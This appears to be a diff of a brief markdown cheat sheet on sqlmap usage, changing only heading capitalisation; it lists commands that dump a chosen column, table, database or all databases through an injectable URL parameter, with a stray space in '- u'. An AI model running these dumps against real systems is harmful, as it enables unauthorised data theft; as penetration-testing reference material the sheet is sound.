@@ -1,16 +1,16 @@
 						
 <h2>SQLmap Usage</h2>
 
- **TO FETCH ONLY COLUMN'S DATA**
+ **To Fetch Only Column's Data**
  `sqlmap - u "url?prm=" -p prm -D dbname -T table_name -C column_name --dump` 
 
- **TO FETCH ONLY ALL COLUMN & ITS DATA**
+ **To Fetch Only All Column & Its Data**
  `sqlmap - u "url?prm=" -p prm -D dbname -T table_name  --dump`
 
- **TO FETCH ENTIRE DATABASE'S DATA** 		     
+ **To Fetch Entire Database's Data** 		     
  `sqlmap - u "url?prm=" -p prm -D dbname  --dump`
 
- **TO FETCH ALL DATABASES**
+ **To Fetch All Databases**
  `sqlmap - u "url?prm=" -p prm --dbs  --dump` 
  or use --dump-all instead of --dump to fetch all databases's all tables and columns  
 
